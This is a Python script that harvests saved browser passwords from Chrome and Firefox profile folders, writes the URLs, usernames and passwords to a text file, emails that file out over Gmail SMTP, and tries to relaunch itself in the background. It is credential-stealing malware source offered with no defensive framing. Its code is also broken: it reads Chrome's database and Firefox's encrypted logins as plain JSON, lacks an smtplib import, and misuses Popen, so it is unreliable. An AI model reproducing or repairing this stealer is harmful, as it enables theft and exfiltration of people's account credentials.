import os
import sys
import json
import getpass
from pathlib import Path
from subprocess import Popen
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def get_password_chrome(path):
    with open(os.path.join(path, 'Login Data'), 'r', encoding='utf-8') as f:
        password_data = json.load(f)
    passwords = []
    for login in password_data:
        password = {'url': login['origin_url'],
                    'username': login['username_value'],
                    'password': login['password_value']}
        passwords.append(password)
    return passwords


def get_password_firefox(path):
    firefox_profile_path = os.path.join(path, [name for name in os.listdir(path) if os.path.isdir(os.path.join(path, name))][0])
    logins_path = os.path.join(firefox_profile_path, 'logins.json')
    with open(logins_path, 'r', encoding='utf-8') as f:
        password_data = json.load(f)
    passwords = []
    for login in password_data['logins']:
        password = {'url': login['formSubmitURL'],
                    'username': login['usernameField'],
                    'password': login['passwordField']}
        passwords.append(password)
    return passwords


def write_passwords_to_file(browser_data):
    with open('browser_data.txt', 'w') as f:
        for browser in browser_data:
            f.write(f'\n\n{browser["name"]} Saved Passwords:\n\n')
            for password in browser['passwords']:
                f.write(f"URL: {password['url']}\nUsername: {password['username']}\nPassword: {password['password']}\n\n")


def send_email(file_path):
    from_email = getpass.getpass("From email: ")
    password = getpass.getpass("Email password: ")
    to_email = getpass.getpass("To email: ")

    with open(file_path, 'r') as f:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = 'Browser Data'

        body = f.read()
        msg.attach(MIMEText(body, 'plain'))

        filename = 'browser_data.txt'
        attachment = open(file_path, 'rb')

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')

        msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_email, password)
        text = msg.as_string()
        server.sendmail(from_email, to_email, text)
        server.quit()


def main():
    roaming_profile = os.path.expanduser('~')

    browser_profiles = [
        {'name': 'Chrome',
         'company': 'Google',
         'product': 'Chrome',
         'path': os.path.join(roaming_profile, 'Google', 'Chrome', 'User Data')},
        {'name': 'Firefox',
         'company': 'Mozilla',
         'product': 'Firefox',
         'path': os.path.join(roaming_profile, 'Mozilla', 'Firefox', 'Profiles')}
    ]

    browser_data = []

    for browser in browser_profiles:
        if os.path.exists(browser['path']):
            password_data = []
            if browser['name'] == 'Firefox':
                password_data = get_password_firefox(browser['path'])
            else:
                password_data = get_password_chrome(browser['path'])

            if password_data:
                browser_data.append({'name': browser['name'], 'passwords': password_data})

    write_passwords_to_file(browser_data)
    send_email('browser_data.txt')

    # Run the script in the background
    Popen(sys.executable, [' ', __file__])
    sys.exit()


if __name__ == '__main__':
    main()